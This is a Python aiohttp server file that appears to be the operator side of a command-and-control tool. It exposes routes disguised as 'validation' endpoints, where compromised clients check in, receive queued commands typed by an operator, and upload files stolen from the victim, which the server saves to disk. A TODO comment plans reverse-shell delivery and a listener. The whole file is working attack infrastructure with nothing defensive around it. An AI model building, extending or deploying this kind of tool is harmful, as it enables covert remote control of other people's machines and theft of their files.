import sys
sys.path.append("./core")
from aiohttp import web
from datetime import datetime
from core.serverhelper import initServer

# class Listener:
#     def __init__(self, name, port):
#         self.name = name
#         self.port = port
#         print()
async def initConnection(request):
    text = "OK"
    return web.Response(text=text)

# TODO: Reverse shell functions: uploadFile(), which will usually be a reverse shell, then a function that starts a listener and prompts the client to execute the reverse shell.
async def checkIn(request):
    cmds = {}
    peername = request.transport.get_extra_info('peername')
    cmdcounter = 0
    text = "OK"
    while True:
        command = input("\033[34m[Source: %s]>>>\033[0m " % str(peername))
        if 'help' in command:
            print("-"*100)
            print("\033[33mHelp menu:\033[0m")
            print("---->COMMANDS<----")
            print(">\033[33mdownload [file]\033[0m: download file in current directory (ex: download image.jpg)")
            print(">\033[33exit\033[0m: exit session and stop client")
            print(">\033[33done\033[0m: send queued commands to client")
        elif 'exit' in command:
            cmdcounter += 1
            cmds["'%s"% str(cmdcounter)] = command
            print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
        elif 'download ' in command:
            cmdcounter += 1
            cmds["'%s" % str(cmdcounter)] = command
            print("\033[33m%s queued for execution on the endpoint at next checkin\033[0m" % command)
        elif command == 'done':
            datalist = list(cmds.values())
            return web.json_response(datalist)
            break
        else:
            print("[-] Command not found")
    return web.Response(text=text)

async def download(request):
    ddata = await request.read()
    timestamp = datetime.now()
    print("Timestamp: %s" % str(timestamp))
    with open ("download%s" % str(timestamp), 'wb') as file:
        file.write(ddata)
        file.close()
        print("[+] File download complete")
    text = "OK"
    return web.Response(text=text)

app = web.Application()
app.add_routes([web.get('/initialize/sequence/0', initConnection),
                web.get('/validate/status', checkIn),
                web.get('/validation/profile/1', download)])

if __name__ == '__main__':
    initServer()
    web.run_app(app)